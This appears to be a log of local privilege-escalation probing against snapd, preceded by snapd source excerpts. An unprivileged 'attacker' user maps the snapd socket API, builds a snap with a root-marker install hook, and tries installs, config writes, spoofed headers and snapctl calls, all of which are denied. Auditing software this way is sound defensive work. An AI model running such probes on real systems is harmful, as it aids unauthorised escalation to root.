   202	    struct sock_fprog SC_CLEANUP(sc_cleanup_sock_fprog) prog_allow = {0};
   203	    struct sock_fprog SC_CLEANUP(sc_cleanup_sock_fprog) prog_deny = {0};
   204	    sc_must_snprintf(profile_path, sizeof(profile_path), "%s/%s.bin2", filter_profile_dir, security_tag);
   205	
   206	    // Wait some time for the security profile to show up. When
   207	    // the system boots snapd will created security profiles, but
   208	    // a service snap (e.g. network-manager) starts in parallel with
   209	    // snapd so for such snaps, the profiles may not be generated
   210	    // yet
   211	    long max_wait = 120;
   212	    const char *MAX_PROFILE_WAIT = getenv("SNAP_CONFINE_MAX_PROFILE_WAIT");
   213	    if (MAX_PROFILE_WAIT != NULL) {
   214	        char *endptr = NULL;
   215	        errno = 0;
   216	        long env_max_wait = strtol(MAX_PROFILE_WAIT, &endptr, 10);
   217	        if (errno != 0 || MAX_PROFILE_WAIT == endptr || *endptr != '\0' || env_max_wait <= 0) {
   218	            die("SNAP_CONFINE_MAX_PROFILE_WAIT invalid");
   219	        }
   220	        max_wait = env_max_wait > 0 ? env_max_wait : max_wait;
   221	    }
   222	    if (max_wait > 3600) {
   223	        max_wait = 3600;
   224	    }
   225	
   226	    if (!sc_wait_for_file(profile_path, max_wait)) {
   227	        /* log but proceed, we'll die a bit later */
   228	        debug("timeout waiting for seccomp binary profile file at %s", profile_path);
   229	    }
   230	    // TODO: move over to open/openat as an additional hardening measure.
   231	
   232	    // validate '/' down to profile_path are root-owned and not
   233	    // 'other' writable to avoid possibility of privilege
   234	    // escalation via bpf program load when paths are incorrectly
   235	    // set on the system.
   236	    validate_bpfpath_is_safe(profile_path);

[atomic and lock helpers]
    35	// OpenExistingLockForReading opens an existing lock file given by "path".
    36	// The lock is opened in read-only mode.
    37	func OpenExistingLockForReading(path string) (*FileLock, error) {
    38		flag := syscall.O_RDONLY | syscall.O_NOFOLLOW | syscall.O_CLOEXEC
    39		file, err := os.OpenFile(path, flag, 0)
    40		if err != nil {
    41			return nil, err
    42		}
    43		l := &FileLock{file: file}
    44		return l, nil
    45	}
    46	
    47	// NewFileLockWithMode creates and opens the lock file given by "path" with the given mode.
    48	func NewFileLockWithMode(path string, mode os.FileMode) (*FileLock, error) {
    49		flag := syscall.O_RDWR | syscall.O_CREAT | syscall.O_NOFOLLOW | syscall.O_CLOEXEC
    50		file, err := os.OpenFile(path, flag, mode)
    51		if err != nil {
    52			return nil, err
    53		}
    54		l := &FileLock{file: file}
    55		return l, nil
    56	}
    57	
    58	// NewFileLockWithFile wraps an open file with a file lock which can be used for
    59	// locking.
    60	func NewFileLockWithFile(f *os.File) *FileLock {
    61		return &FileLock{file: f}
    62	}
    63	
    64	// NewFileLock creates and opens the lock file given by "path" with mode 0600.
    65	func NewFileLock(path string) (*FileLock, error) {
    66		return NewFileLockWithMode(path, 0600)
    67	}
    68	
    69	// Path returns the path of the lock file.
    70	func (l *FileLock) Path() string {
    82	func NewAtomicFile(filename string, perm os.FileMode, flags AtomicWriteFlags, uid sys.UserID, gid sys.GroupID) (aw *AtomicFile, err error) {
    83		if flags&AtomicWriteFollow != 0 {
    84			if fn, err := os.Readlink(filename); err == nil || (fn != "" && os.IsNotExist(err)) {
    85				if filepath.IsAbs(fn) {
    86					filename = fn
    87				} else {
    88					filename = filepath.Join(filepath.Dir(filename), fn)
    89				}
    90			}
    91		}
    92		// The tilde is appended so that programs that inspect all files in some
    93		// directory are more likely to ignore this file as an editor backup file.
    94		//
    95		// This fixes an issue in apparmor-utils package, specifically in
    96		// aa-enforce. Tools from this package enumerate all profiles by loading
    97		// parsing any file found in /etc/apparmor.d/, skipping only very specific
    98		// suffixes, such as the one we selected below.
    99		tmp := filename + "." + randutil.RandomString(12) + "~"
   100	
   101		fd, err := os.OpenFile(tmp, os.O_WRONLY|os.O_CREATE|os.O_TRUNC|os.O_EXCL, perm)
   102		if err != nil {
   103			return nil, err
   104		}
   105	
   187		if err := os.Rename(aw.tmpname, aw.target); err != nil {
   188			return err
   189		}
   190		aw.renamed = true // it is now too late to Cancel()
   191	
   192		if !snapdUnsafeIO {
   193			return dir.Sync()
   194		}
   236	func AtomicWrite(filename string, reader io.Reader, perm os.FileMode, flags AtomicWriteFlags) (err error) {
   237		return AtomicWriteChown(filename, reader, perm, flags, NoChown, NoChown)
   238	}
   239	
   240	func AtomicWriteFile(filename string, data []byte, perm os.FileMode, flags AtomicWriteFlags) (err error) {
   241		return AtomicWriteChown(filename, bytes.NewReader(data), perm, flags, NoChown, NoChown)
   242	}
   243	
   244	func AtomicWriteFileChown(filename string, data []byte, perm os.FileMode, flags AtomicWriteFlags, uid sys.UserID, gid sys.GroupID) (err error) {
   245		return AtomicWriteChown(filename, bytes.NewReader(data), perm, flags, uid, gid)
   246	}
   247	
   248	func AtomicWriteChown(filename string, reader io.Reader, perm os.FileMode, flags AtomicWriteFlags, uid sys.UserID, gid sys.GroupID) (err error) {
   249		aw, err := NewAtomicFile(filename, perm, flags, uid, gid)
   250		if err != nil {

## REST endpoint inventory reachable by uid1001

## GET / on snapd socket
$ runuser -u attacker -- bash -lc curl\ --max-time\ 8\ -sS\ -i\ --unix-socket\ /run/snapd.socket\ http://localhost/\ \|\ sed\ -n\ \"1\,40p\"
HTTP/1.1 200 OK
Content-Type: application/json
Date: Sun, 17 May 2026 19:55:04 GMT
Content-Length: 64

{"type":"sync","status-code":200,"status":"OK","result":["TBD"]}rc=0

## GET /v2/debug?aspect=features endpoint list on snapd socket
$ runuser -u attacker -- bash -lc curl\ --max-time\ 15\ -sS\ --unix-socket\ /run/snapd.socket\ \"http://localhost/v2/debug\?aspect=features\"\ \|\ jq\ -r\ \".result.endpoints\[\]\ \|\ \[.method\,.path\,\(\(.actions//\[\]\)\|join\(\\\"\,\\\"\)\)\]\ \|\ @tsv\"\ \|\ sed\ -n\ \"1\,140p\"
GET	/	
GET	/v2/system-info	
POST	/v2/system-info	advise-system-key-mismatch
GET	/v2/system-info/storage-encrypted	
POST	/v2/login	
POST	/v2/logout	
GET	/v2/icons/{name}/icon	
GET	/v2/find	
GET	/v2/snaps	
POST	/v2/snaps	install,refresh,revert,switch,hold,unhold,snapshot,remove,enable,disable
GET	/v2/snaps/{name}	
POST	/v2/snaps/{name}	install,refresh,revert,switch,hold,unhold,remove,enable,disable
GET	/v2/snaps/{name}/file	
POST	/v2/download	
GET	/v2/snaps/{name}/conf	
PUT	/v2/snaps/{name}/conf	
GET	/v2/interfaces	
POST	/v2/interfaces	connect,disconnect
GET	/v2/assertions	
POST	/v2/assertions	
GET	/v2/assertions/{assertType}	
GET	/v2/changes/{id}	
POST	/v2/changes/{id}	abort
GET	/v2/changes	
POST	/v2/create-user	
POST	/v2/buy	
GET	/v2/buy/ready	
POST	/v2/snapctl	
GET	/v2/users	
POST	/v2/users	create,remove
GET	/v2/sections	
GET	/v2/categories	
GET	/v2/aliases	
POST	/v2/aliases	alias,unalias,prefer
GET	/v2/apps	
POST	/v2/apps	start,stop,restart
GET	/v2/logs	
GET	/v2/warnings	
POST	/v2/warnings	okay
GET	/v2/debug/pprof/	
GET	/v2/debug	
POST	/v2/debug	add-warning,unshow-warnings,ensure-state-soon,can-manage-refreshes,prune,stacktraces,create-recovery-system,migrate-home
GET	/v2/snapshots	
POST	/v2/snapshots	check,restore,forget
GET	/v2/snapshots/{id}/export	
GET	/v2/connections	
GET	/v2/model	
POST	/v2/model	
POST	/v2/cohorts	create
GET	/v2/model/serial	
POST	/v2/model/serial	forget
GET	/v2/systems	
POST	/v2/systems	reboot,create,install
GET	/v2/systems/{label}	
POST	/v2/systems/{label}	do,reboot,install,create,remove,check-passphrase,check-pin,fix-encryption-support
GET	/v2/accessories/themes	
POST	/v2/accessories/themes	
GET	/v2/accessories/changes/{id}	
GET	/v2/validation-sets	
GET	/v2/validation-sets/{account}/{name}	
POST	/v2/validation-sets/{account}/{name}	forget,apply
POST	/v2/internal/console-conf-start	
GET	/v2/system-recovery-keys	
POST	/v2/system-recovery-keys	remove
GET	/v2/quotas	
POST	/v2/quotas	ensure,remove
GET	/v2/quotas/{group}	
GET	/v2/confdb/{account}/{confdb-schema}/{view}	
PUT	/v2/confdb/{account}/{confdb-schema}/{view}	
POST	/v2/confdb	delegate,undelegate
GET	/v2/notices	
POST	/v2/notices	add
GET	/v2/notices/{id}	
GET	/v2/interfaces/requests/prompts	
GET	/v2/interfaces/requests/prompts/{id}	
POST	/v2/interfaces/requests/prompts/{id}	allow,deny
GET	/v2/interfaces/requests/rules	
POST	/v2/interfaces/requests/rules	add,remove
GET	/v2/interfaces/requests/rules/{id}	
POST	/v2/interfaces/requests/rules/{id}	patch,remove
POST	/v2/system-secureboot	efi-secureboot-update-startup,efi-secureboot-update-db-cleanup,efi-secureboot-update-db-prepare
GET	/v2/system-volumes	
POST	/v2/system-volumes	generate-recovery-key,check-recovery-key,add-recovery-key,replace-recovery-key,replace-platform-key,check-passphrase,check-pin,change-passphrase,change-pin
rc=0

## GET /v2/system-info
socket=/run/snapd.socket method=GET path=/v2/system-info body=
HTTP/1.1 200 OK
Content-Type: application/json
Date: Sun, 17 May 2026 19:55:04 GMT
Transfer-Encoding: chunked

{"type":"sync","status-code":200,"status":"OK","result":{"architecture":"arm64","build-id":"13476c98a1eccfcc83435dda3ccbd6db1b4f65be","confinement":"partial","features":{"apparmor-prompting":{"supported":false,"unsupported-reason":"cannot check apparmor kernel features: open /sys/kernel/security/apparmor/features: no such file or directory","enabled":false},"check-disk-space-install":{"supported":true,"enabled":false},"check-disk-space-refresh":{"supported":true,"enabled":false},"check-disk-space-remove":{"supported":true,"enabled":false},"classic-preserves-xdg-runtime-dir":{"supported":true,"enabled":true},"clustering":{"supported":true,"enabled":false},"confdb":{"supported":true,"enabled":false},"confdb-control":{"supported":true,"enabled":false},"content-compatibility-label":{"supported":true,"enabled":false},"dbus-activation":{"supported":true,"enabled":true},"gate-auto-refresh-hook":{"supported":true,"enabled":false},"hidden-snap-folder":{"supported":true,"enabled":false},"hotplug":{"supported":true,"enabled":false},"layouts":{"supported":true,"enabled":true},"move-snap-home-dir":{"supported":true,"enabled":false},"parallel-instances":{"supported":true,"enabled":false},"per-user-mount-namespace":{"supported":true,"enabled":false},"quota-groups":{"supported":true,"enabled":false},"refresh-app-awareness":{"supported":true,"enabled":true},"refresh-app-awareness-ux":{"supported":true,"enabled":false},"user-daemons":{"supported":true,"enabled":false}},"kernel-version":"6.10.14-linuxkit","locations":{"snap-bin-dir":"/snap/bin","snap-mount-dir":"/snap"},"managed":false,"on-classic":true,"os-release":{"id":"ubuntu","version-id":"24.04"},"refresh":{"timer":"00:00~24:00/4","hold":"2026-05-17T00:51:00Z"},"sandbox-features":{"configfiles":["mediated-configfiles"],"confinement-options":["classic","devmode"],"dbus":["mediated-bus-access"],"kmod":["mediated-modprobe"],"ldconfig":["mediated-ldconfig"],"mount":["layouts","mount-namespace","per-snap-persistency","per-snap-profiles","per-snap-updates","per-snap-user-profiles","stale-base-invalidation"],"seccomp":["bpf-actlog","bpf-argument-filtering","kernel:allow","kernel:errno","kernel:kill_process","kernel:kill_thread","kernel:log","kernel:trace","kernel:trap","kernel:user_notif"],"symlinks":["mediated-symlinks"],"udev":["device-cgroup-v2","device-filtering","tagging"]},"series":"16","snapd-bin-from":"native-package","system-mode":"run","version":"2.74.1+ubuntu24.04.4","virtualization":"docker"}}rc=0

## GET /v2/snaps
socket=/run/snapd.socket method=GET path=/v2/snaps body=
HTTP/1.1 200 OK
Content-Type: application/json
Date: Sun, 17 May 2026 19:55:04 GMT
Content-Length: 79

{"type":"sync","status-code":200,"status":"OK","result":[],"sources":["local"]}rc=0

## GET /v2/find?name=core24
socket=/run/snapd.socket method=GET path=/v2/find?name=core24 body=
HTTP/1.1 200 OK
Content-Type: application/json
Date: Sun, 17 May 2026 19:55:05 GMT
Transfer-Encoding: chunked

{"type":"sync","status-code":200,"status":"OK","result":[{"id":"dwTAh7MZZ01zyriOZErqd1JynQLiOGvM","title":"Core 24 base snap","summary":"Snap runtime environment","description":"Base snaps are a specific type of snap that include libraries and dependencies common to many applications. They provide a consistent and reliable execution environment for the snap packages that use them.\n\nThe core24 base snap provides a runtime environment based on Ubuntu 24.04 (Noble Numbat).\n\nOther Ubuntu environment base snaps include:\n-   Core 18: \u003chttps://snapcraft.io/core18\u003e\n-   Core 20: \u003chttps://snapcraft.io/core20\u003e \n-   Core 22: \u003chttps://snapcraft.io/core22\u003e\n\n**Using a base snap**\n\nBase snaps are installed automatically when a snap package requires them. Only one of each type of base snap is ever installed.\n\nManually removing a base snap may affect the stability of your system.\n\n**Building snaps with core24**\n\nSnap developers can use this base in their own snaps by adding the following to the snap's snapcraft.yaml:\n\n    base: core24\n\n**Additional Information***\n\nFor more details, and guidance on using base snaps, see our documentation: \u003chttps://snapcraft.io/docs/base-snaps\u003e","download-size":64864256,"icon":"https://dashboard.snapcraft.io/site_media/appmedia/2024/06/core-icon-large_yqSW18J.png","name":"core24","publisher":{"id":"canonical","username":"canonical","display-name":"Canonical","validation":"verified"},"store-url":"https://snapcraft.io/core24","developer":"canonical","status":"available","type":"base","version":"20260410","channel":"stable","ignore-validation":false,"revision":"1644","confinement":"strict","grade":"","private":false,"devmode":false,"jailmode":false,"license":"Other Open Source","links":{"issues":["https://github.com/snapcore/core-base/issues"],"source":["https://github.com/snapcore/core-base"],"website":["https://snapcraft.io/"]},"contact":"","website":"https://snapcraft.io/","media":[{"type":"icon","url":"https://dashboard.snapcraft.io/site_media/appmedia/2024/06/core-icon-large_yqSW18J.png","width":498,"height":498},{"type":"screenshot","url":"https://dashboard.snapcraft.io/site_media/appmedia/2024/06/core-01-1718731728.png","width":568,"height":932},{"type":"screenshot","url":"https://dashboard.snapcraft.io/site_media/appmedia/2024/06/core-02-1718731728.png","width":568,"height":932},{"type":"screenshot","url":"https://dashboard.snapcraft.io/site_media/appmedia/2024/06/core-03-1718731728.png","width":568,"height":932}],"categories":[{"name":"devices-and-iot","featured":false}],"channels":{"fips-updates/beta":{"revision":"1642","confinement":"strict","version":"20260410+fips","channel":"fips-updates/beta","epoch":{"read":[0],"write":[0]},"size":65404928,"released-at":"2026-04-11T00:07:00.650449Z"},"fips-updates/candidate":{"revision":"1527","confinement":"strict","version":"20260125+fips","channel":"fips-updates/candidate","epoch":{"read":[0],"write":[0]},"size":65466368,"released-at":"2026-04-10T11:59:36.370527Z"},"fips-updates/edge":{"revision":"1727","confinement":"strict","version":"20260517+fips","channel":"fips-updates/edge","epoch":{"read":[0],"write":[0]},"size":65409024,"released-at":"2026-05-17T04:41:09.017546Z"},"latest/beta":{"revision":"1644","confinement":"strict","version":"20260410","channel":"latest/beta","epoch":{"read":[0],"write":[0]},"size":64864256,"released-at":"2026-04-11T00:06:59.778125Z"},"latest/candidate":{"revision":"1644","confinement":"strict","version":"20260410","channel":"latest/candidate","epoch":{"read":[0],"write":[0]},"size":64864256,"released-at":"2026-05-11T12:30:39.878666Z"},"latest/edge":{"revision":"1713","confinement":"strict","version":"20260509","channel":"latest/edge","epoch":{"read":[0],"write":[0]},"size":64868352,"released-at":"2026-05-09T06:50:14.74109Z"},"latest/stable":{"revision":"1644","confinement":"strict","version":"20260410","channel":"latest/stable","epoch":{"read":[0],"write":[0]},"size":64864256,"released-at":"2026-05-16T03:10:04.330786Z"}},"tracks":["latest","fips-updates"]}],"sources":["store"],"suggested-currency":"USD"}rc=0

## GET /v2/interfaces
socket=/run/snapd.socket method=GET path=/v2/interfaces body=
HTTP/1.1 200 OK
Content-Type: application/json
Date: Sun, 17 May 2026 19:55:05 GMT
Content-Length: 59

{"type":"sync","status-code":200,"status":"OK","result":{}}rc=0

## GET /v2/connections
socket=/run/snapd.socket method=GET path=/v2/connections body=
HTTP/1.1 200 OK
Content-Type: application/json
Date: Sun, 17 May 2026 19:55:05 GMT
Content-Length: 97

{"type":"sync","status-code":200,"status":"OK","result":{"established":[],"plugs":[],"slots":[]}}rc=0

## GET /v2/changes
socket=/run/snapd.socket method=GET path=/v2/changes body=
HTTP/1.1 200 OK
Content-Type: application/json
Date: Sun, 17 May 2026 19:55:05 GMT
Content-Length: 59

{"type":"sync","status-code":200,"status":"OK","result":[]}rc=0

## GET /v2/apps?select=service
socket=/run/snapd.socket method=GET path=/v2/apps?select=service body=
HTTP/1.1 200 OK
Content-Type: application/json
Date: Sun, 17 May 2026 19:55:05 GMT
Content-Length: 59

{"type":"sync","status-code":200,"status":"OK","result":[]}rc=0

## GET /v2/model
socket=/run/snapd.socket method=GET path=/v2/model body=
HTTP/1.1 200 OK
Content-Type: application/x.ubuntu.assertion
X-Ubuntu-Assertions-Count: 1
Date: Sun, 17 May 2026 19:55:05 GMT
Content-Length: 957

type: model
authority-id: generic
series: 16
brand-id: generic
model: generic-classic
classic: true
timestamp: 2017-07-27T00:00:00.0Z
sign-key-sha3-384: d-JcZF9nD9eBw7bwMnH61x-bklnQOhQud1Is6o_cn2wTj8EYDi9musrIT9z2MdAa

AcLBXAQAAQoABgUCWYuXiAAKCRAdLQyY+/mCiST0D/0XGQauzV2bbTEy6DkrR1jlNbI6x8vfIdS8
KvEWYvzOWNhNlVSfwNOkFjs3uMHgCO6/fCg03wGXTyV9D7ZgrMeUzWrYp6EmXk8/LQSaBnff86XO
4/vYyfyvEYavhF0kQ6QGg8Cqr0EaMyw0x9/zWEO/Ll9fH/8nv9qcQq8N4AbebNvNxtGsCmJuXpSe
2rxl3Dw8XarYBmqgcBQhXxRNpa6/AgaTNBpPOTqgNA8ZtmbZwYLuaFjpZP410aJSs+evSKepy/ce
+zTA7RB3384YQVeZDdTudX2fGtuCnBZBAJ+NYlk0t8VFXxyOhyMSXeylSpNSx4pCqmUZRyaf5SDS
g1XxJet4IP0stZH1SfPOwc9oE81/bJlKsb9QIQKQRewvtUCLfe9a6Vy/CYd2elvcWOmeANVrJK0m
nRaz6VBm09RJTuwUT6vNugXSOCeF7W3WN1RHJuex0zw+nP3eCehxFSr33YrVniaA7zGfjXvS8tKx
AINNQB4g2fpfet4na6lPPMYM41WHIHPCMTz/fJQ6dZBSEg6UUZ/GiQhGEfWPBteK7yd9pQ8qB3fj
ER4UvKnR7hcVI26e3NGNkXP5kp0SFCkV5NQs8rzXzokpB7p/V5Pnqp3Km6wu45cU6UiTZFhR2IMT
l+6AMtrS4gDGHktOhwfmOMWqmhvR/INF+TjaWbsB6g==
rc=0

## GET /v2/system-info/storage-encrypted
socket=/run/snapd.socket method=GET path=/v2/system-info/storage-encrypted body=
HTTP/1.1 200 OK
Content-Type: application/json
Date: Sun, 17 May 2026 19:55:05 GMT
Content-Length: 83

{"type":"sync","status-code":200,"status":"OK","result":{"status":"indeterminate"}}rc=0

## GET /v2/quotas
socket=/run/snapd.socket method=GET path=/v2/quotas body=
HTTP/1.1 200 OK
Content-Type: application/json
Date: Sun, 17 May 2026 19:55:05 GMT
Content-Length: 59

{"type":"sync","status-code":200,"status":"OK","result":[]}rc=0

## GET /v2/notices
socket=/run/snapd.socket method=GET path=/v2/notices body=
HTTP/1.1 200 OK
Content-Type: application/json
Date: Sun, 17 May 2026 19:55:05 GMT
Content-Length: 333

{"type":"sync","status-code":200,"status":"OK","result":[{"id":"1","user-id":null,"type":"change-update","key":"1","first-occurred":"2026-05-16T22:51:04.569383886Z","last-occurred":"2026-05-16T22:51:04.64574522Z","last-repeated":"2026-05-16T22:51:04.64574522Z","occurrences":3,"last-data":{"kind":"seed"},"expire-after":"168h0m0s"}]}rc=0

## GET /v2/assertions
socket=/run/snapd.socket method=GET path=/v2/assertions body=
HTTP/1.1 200 OK
Content-Type: application/json
Date: Sun, 17 May 2026 19:55:05 GMT
Content-Length: 474

{"type":"sync","status-code":200,"status":"OK","result":{"types":["account","account-key","account-key-request","base-declaration","cluster","confdb-control","confdb-schema","device-session-request","hardware-identity","model","preseed","repair","request-message","response-message","serial","serial-request","snap-build","snap-declaration","snap-developer","snap-resource-pair","snap-resource-revision","snap-revision","store","system-user","validation","validation-set"]}}rc=0

## GET /v2/users
socket=/run/snapd.socket method=GET path=/v2/users body=
HTTP/1.1 403 Forbidden
Content-Type: application/json
Date: Sun, 17 May 2026 19:55:05 GMT
Content-Length: 116

{"type":"error","status-code":403,"status":"Forbidden","result":{"message":"access denied","kind":"login-required"}}rc=0

## GET /v2/logs should auth-gate
socket=/run/snapd.socket method=GET path=/v2/logs body=
HTTP/1.1 401 Unauthorized
Content-Type: application/json
Date: Sun, 17 May 2026 19:55:05 GMT
Content-Length: 119

{"type":"error","status-code":401,"status":"Unauthorized","result":{"message":"access denied","kind":"login-required"}}rc=0

## GET /v2/system-recovery-keys should auth/root-gate
socket=/run/snapd.socket method=GET path=/v2/system-recovery-keys body=
HTTP/1.1 403 Forbidden
Content-Type: application/json
Date: Sun, 17 May 2026 19:55:05 GMT
Content-Length: 116

{"type":"error","status-code":403,"status":"Forbidden","result":{"message":"access denied","kind":"login-required"}}rc=0

## GET /v2/confdb arbitrary view should auth-gate
socket=/run/snapd.socket method=GET path=/v2/confdb/test/test/view body=
HTTP/1.1 401 Unauthorized
Content-Type: application/json
Date: Sun, 17 May 2026 19:55:05 GMT
Content-Length: 119

{"type":"error","status-code":401,"status":"Unauthorized","result":{"message":"access denied","kind":"login-required"}}rc=0

## build local attacker snap with root marker install hook

## snap pack as attacker
$ runuser -u attacker -- snap pack /tmp/snapd-current-default-deep/snap-src /tmp
built: /tmp/snapd-current-default-deep-lpe_1.0_all.snap
rc=0
-rw-r--r-- 644 attacker:attacker 16384 /tmp/snapd-current-default-deep-lpe_1.0_all.snap
-rwxr-xr-x 755 attacker:attacker 372 /tmp/snapd-current-default-deep/snap-src/meta/hooks/install

## privileged REST and CLI mutation attempts as uid1001

## POST /v2/snaps install store snap
socket=/run/snapd.socket method=POST path=/v2/snaps body={"action":"install","snaps":["hello-world"]}
HTTP/1.1 401 Unauthorized
Content-Type: application/json
Date: Sun, 17 May 2026 19:55:05 GMT
Content-Length: 119

{"type":"error","status-code":401,"status":"Unauthorized","result":{"message":"access denied","kind":"login-required"}}rc=0

## POST /v2/snaps install local snap-path JSON
socket=/run/snapd.socket method=POST path=/v2/snaps body={"action":"install","snap-path":"/tmp/snapd-current-default-deep-lpe_1.0_all.snap","dangerous":true}
HTTP/1.1 401 Unauthorized
Content-Type: application/json
Date: Sun, 17 May 2026 19:55:06 GMT
Content-Length: 119

{"type":"error","status-code":401,"status":"Unauthorized","result":{"message":"access denied","kind":"login-required"}}rc=0

## POST /v2/snaps multipart dangerous local snap
HTTP/1.1 401 Unauthorized
Content-Type: application/json
Date: Sun, 17 May 2026 19:55:06 GMT
Content-Length: 119

{"type":"error","status-code":401,"status":"Unauthorized","result":{"message":"access denied","kind":"login-required"}}rc=0

## snap install --dangerous local snap
$ runuser -u attacker -- bash -lc snap\ install\ --dangerous\ \'/tmp/snapd-current-default-deep-lpe_1.0_all.snap\'\ 2\>\&1
error: access denied (try with sudo)
rc=1

## snap try attacker snap tree
$ runuser -u attacker -- bash -lc snap\ try\ \'/tmp/snapd-current-default-deep/snap-src\'\ 2\>\&1
error: access denied (try with sudo)
rc=1

## POST /v2/interfaces connect
socket=/run/snapd.socket method=POST path=/v2/interfaces body={"action":"connect","slots":[{"snap":"core","slot":"network"}],"plugs":[{"snap":"hello-world","plug":"network"}]}
HTTP/1.1 401 Unauthorized
Content-Type: application/json
Date: Sun, 17 May 2026 19:55:06 GMT
Content-Length: 119

{"type":"error","status-code":401,"status":"Unauthorized","result":{"message":"access denied","kind":"login-required"}}rc=0

## PUT /v2/snaps/system/conf env-like values
socket=/run/snapd.socket method=PUT path=/v2/snaps/system/conf body={"SNAPD_DEBUG":"1","experimental.parallel-instances":true}
HTTP/1.1 401 Unauthorized
Content-Type: application/json
Date: Sun, 17 May 2026 19:55:06 GMT
Content-Length: 119

{"type":"error","status-code":401,"status":"Unauthorized","result":{"message":"access denied","kind":"login-required"}}rc=0

## POST /v2/assertions invalid assertion
socket=/run/snapd.socket method=POST path=/v2/assertions body=not-an-assertion
HTTP/1.1 401 Unauthorized
Content-Type: application/json
Date: Sun, 17 May 2026 19:55:06 GMT
Content-Length: 119

{"type":"error","status-code":401,"status":"Unauthorized","result":{"message":"access denied","kind":"login-required"}}rc=0

## POST /v2/debug add-warning
socket=/run/snapd.socket method=POST path=/v2/debug body={"action":"add-warning","message":"uid1001-probe"}
HTTP/1.1 403 Forbidden
Content-Type: application/json
Date: Sun, 17 May 2026 19:55:06 GMT
Content-Length: 116

{"type":"error","status-code":403,"status":"Forbidden","result":{"message":"access denied","kind":"login-required"}}rc=0

## POST /v2/system-info open write but invalid system key
socket=/run/snapd.socket method=POST path=/v2/system-info body={"action":"advise-system-key-mismatch"}
HTTP/1.1 400 Bad Request
Content-Type: application/json
Date: Sun, 17 May 2026 19:55:06 GMT
Content-Length: 211

{"type":"error","status-code":400,"status":"Bad Request","result":{"message":"cannot decode system key: EOF"},"maintenance":{"message":"daemon is stopping to wait for socket activation","kind":"daemon-restart"}}rc=0

## POST /v2/notices add snap-run-inhibit from curl process
socket=/run/snapd.socket method=POST path=/v2/notices body={"action":"add","type":"snap-run-inhibit","key":"hello-world"}
HTTP/1.1 403 Forbidden
Content-Type: application/json
Date: Sun, 17 May 2026 19:55:06 GMT
Content-Length: 240

{"type":"error","status-code":403,"status":"Forbidden","result":{"message":"only snap command can record notices","kind":"login-required"},"maintenance":{"message":"daemon is stopping to wait for socket activation","kind":"daemon-restart"}}rc=0

## POST /v2/warnings okay
socket=/run/snapd.socket method=POST path=/v2/warnings body={"action":"okay","timestamp":"1970-01-01T00:00:00Z"}
HTTP/1.1 401 Unauthorized
Content-Type: application/json
Date: Sun, 17 May 2026 19:55:06 GMT
Content-Length: 119

{"type":"error","status-code":401,"status":"Unauthorized","result":{"message":"access denied","kind":"login-required"}}rc=0

## POST /v2/aliases alias
socket=/run/snapd.socket method=POST path=/v2/aliases body={"action":"alias","snap":"hello-world","app":"hello-world","alias":"hw"}
HTTP/1.1 401 Unauthorized
Content-Type: application/json
Date: Sun, 17 May 2026 19:55:06 GMT
Content-Length: 119

{"type":"error","status-code":401,"status":"Unauthorized","result":{"message":"access denied","kind":"login-required"}}rc=0

## POST /v2/apps start
socket=/run/snapd.socket method=POST path=/v2/apps body={"action":"start","names":["hello-world"]}
HTTP/1.1 401 Unauthorized
Content-Type: application/json
Date: Sun, 17 May 2026 19:55:06 GMT
Content-Length: 119

{"type":"error","status-code":401,"status":"Unauthorized","result":{"message":"access denied","kind":"login-required"}}rc=0

## POST /v2/quotas ensure
socket=/run/snapd.socket method=POST path=/v2/quotas body={"action":"ensure","group-name":"scd","constraints":{"memory":1048576}}
HTTP/1.1 403 Forbidden
Content-Type: application/json
Date: Sun, 17 May 2026 19:55:06 GMT
Content-Length: 116

{"type":"error","status-code":403,"status":"Forbidden","result":{"message":"access denied","kind":"login-required"}}rc=0

## POST /v2/model invalid
socket=/run/snapd.socket method=POST path=/v2/model body=garbage
HTTP/1.1 403 Forbidden
Content-Type: application/json
Date: Sun, 17 May 2026 19:55:06 GMT
Content-Length: 116

{"type":"error","status-code":403,"status":"Forbidden","result":{"message":"access denied","kind":"login-required"}}rc=0

## POST /v2/systems install-like
socket=/run/snapd.socket method=POST path=/v2/systems body={"action":"install","label":"scd"}
HTTP/1.1 403 Forbidden
Content-Type: application/json
Date: Sun, 17 May 2026 19:55:06 GMT
Content-Length: 116

{"type":"error","status-code":403,"status":"Forbidden","result":{"message":"access denied","kind":"login-required"}}rc=0

## after REST/CLI mutation attempts
MISSING /root/snapd_current_default_deep_root_marker
MISSING /tmp/snapd_current_default_deep_tmp_marker
MISSING /tmp/snapd_current_default_deep_suid_sh
ROOT_PROOF_CANDIDATE=NO

## snapd-snap.socket peer validation as uid1001

## GET /v2/system-info on snapd-snap.socket
socket=/run/snapd-snap.socket method=GET path=/v2/system-info body=
HTTP/1.1 403 Forbidden
Content-Type: application/json
Date: Sun, 17 May 2026 19:55:09 GMT
Content-Length: 155

{"type":"error","status-code":403,"status":"Forbidden","result":{"message":"could not determine snap name for pid: not supported","kind":"login-required"}}rc=0

## GET /v2/system-info on snapd-snap.socket with spoof headers
socket=/run/snapd-snap.socket method=GET path=/v2/system-info body=
HTTP/1.1 403 Forbidden
Content-Type: application/json
Date: Sun, 17 May 2026 19:55:09 GMT
Content-Length: 155

{"type":"error","status-code":403,"status":"Forbidden","result":{"message":"could not determine snap name for pid: not supported","kind":"login-required"}}rc=0

## POST /v2/snapctl get outside snap
socket=/run/snapd-snap.socket method=POST path=/v2/snapctl body={"context-id":"bogus","args":["get","system"]}
HTTP/1.1 400 Bad Request
Content-Type: application/json
Date: Sun, 17 May 2026 19:55:09 GMT
Content-Length: 168

{"type":"error","status-code":400,"status":"Bad Request","result":{"message":"snapctl: cannot invoke snapctl operation commands (here \"get\") from outside of a snap"}}rc=0

## POST /v2/snapctl set outside snap
socket=/run/snapd-snap.socket method=POST path=/v2/snapctl body={"context-id":"bogus","args":["set","system.probe=true"]}
HTTP/1.1 403 Forbidden
Content-Type: application/json
Date: Sun, 17 May 2026 19:55:09 GMT
Content-Length: 150

{"type":"error","status-code":403,"status":"Forbidden","result":{"message":"cannot use \"set\" with uid 1001, try with sudo","kind":"login-required"}}rc=0

## snap-confine direct default, env, tag, and helper probes

## direct snap-confine strict default reaches missing base before payload
